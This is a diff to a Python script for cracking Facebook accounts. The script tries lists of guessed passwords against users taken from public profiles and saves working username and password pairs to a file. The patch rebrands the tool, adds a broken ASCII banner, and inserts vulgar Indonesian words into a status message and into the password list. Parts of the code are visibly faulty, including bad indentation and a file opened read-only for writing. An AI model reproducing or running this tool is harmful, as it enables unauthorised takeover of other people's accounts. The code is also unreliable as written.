@@ -1,7 +1,6 @@
-#Creator:Fahmiapz
-#Date:19/09/2020
-#time:23:00
-#Recode Teros Boss Tinggal Pake Apa Susahnya Anjeng
+#Creator:Faizul
+#Date:11/11/2020
+#time:1:00
 import requests,re,os,sys,time,json,random,urllib,mechanize
 from requests.exceptions import ConnectionError
 from time import sleep as timeout
@@ -10,8 +9,13 @@ from concurrent.futures import ThreadPoolExecutor
 def clear():
     os.system('clear')
 def baner():
-    print('\t\033[91m~\033[94mFB\033[00m Crack From Public\033[91m~\033[00m\n')
-    print('\t\033[93m<\033[90m--------------------\033[93m>\033[00m')
+    print('\033\33;1m_____                   ___.                  __')    
+print('\033\33;1m_/ ____\____    ____  ____\_ |__   ____   ____ |  | __')
+print('\033\33;1m\   __\\__  \ _/ ___\/ __ \| __ \ /  _ \ /  _ \|  |/ /')
+ print('\033\33;1m|  |   / __ \\  \__\  ___/| \_\ (  <_> |  <_> )    <') 
+ print('\033\33;1m|__|  (____  /\___  >___  >___  /\____/ \____/|__|_ \')
+            print('\033\33;1m\/     \/    \/    \/')                  
+  
 die=0
 chek=0
 result=0
@@ -53,7 +57,7 @@ def login(user,pw,cek=False):
                   with open('valid.txt') as f:
                        f.write(user + '|' + pw + '\n')
           elif 'www.facebook.com' in q['error_msg']:
-             print('\r\033[00m[\033[93mCheck\033[00m]'+user+'\033[96m|\033[00m'+pw                        ,end="")
+             print('\r\033[00m[\033[93mSedang ngentot\033[00m]'+user+'\033[96m|\033[00m'+pw                        ,end="")
              chek+=1
              if cek:
                   check.append(user+'|'+pw)
@@ -103,6 +107,7 @@ def search():
                  litpas.append('Anjing')
                  litpas.append('786786')
                  litpas.append('Bangladesh')
+                 litpas.append('memek')
                  for passw in set(litpas):
                      ex.submit(login,(users[1]),(passw))
 
